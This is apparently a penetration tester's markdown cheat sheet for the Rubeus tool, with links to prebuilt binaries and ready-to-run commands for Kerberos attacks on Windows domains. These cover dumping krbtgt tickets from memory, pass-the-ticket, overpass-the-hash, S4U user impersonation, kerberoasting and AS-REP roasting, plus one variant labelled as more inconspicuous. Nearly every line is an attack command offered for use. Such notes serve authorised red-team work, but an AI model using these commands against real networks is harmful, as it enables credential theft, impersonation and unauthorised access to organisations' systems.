### Sources or compile directly from github
https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe  
https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1  

## note: always use the fully qualified domain name to execute commands after getting a ticket

### List kerberos tickets applied to current logon session
```
Rubeus.exe triage
```

### Dump tickets inside memory
```
Invoke-Rubeus -Command 'dump /service:krbtgt'
```

### Pass ticket to current session (/ticket can also be pathToKirbiFile)
```
Invoke-Rubeus -Command 'ptt /ticket:<base64>'
```

### Purge all kerberos tickets
```
Invoke-Rubeus -Command 'purge'
```

### Get TGT for specific user (Overpass-the-Hash), /nowrap print with no line breaks, use /ptt to import to session
```
Invoke-Rubeus -Command 'asktgt /user:<user> /domain:<domain> /rc4:<ntHash> /nowrap'
```

### Get TGT using - the more inconspicuous way
```
Invoke-Rubeus -Command 'hash /user:<user> /domain:<domain> /password:<password>'
Invoke-Rubeus -Command 'asktgt /user:<user> /domain:<domain> /aes256:<aes> /dc:<domainController> /ptt'
```

### Impersonate user (use cifs as alternative service for http) (further request will need to use the fqdn)
```
Invoke-Rubeus -Command 's4u /impersonateuser:<targetUser> /msdsspn:http/<fqdnRhost> /ticket:<base64> /altservice:cifs'
```


### Create new process
```
Invoke-Rubeus -Command 'createnetonly /program:C:\Windows\System32\cmd.exe'
```

#### pass a ticket to the process
```
Invoke-Rubeus -Command 'ptt /luid:<luid> /ticket:<base64>'
```


### Kerberoasting using john format
```
Invoke-Rubeus -Command 'kerberoast /outfile:<file>.txt '
```

### Asrep roasting using john format 
```
Invoke-Rubeus -Command 'asreproast /outfile:<file>.txt '
```

### As-rep roasting for specific user and hashcat format
```
Invoke-Rubeus -Command 'asreproast /outfile:<file>.txt /format:hashcat /user:<user>'
```

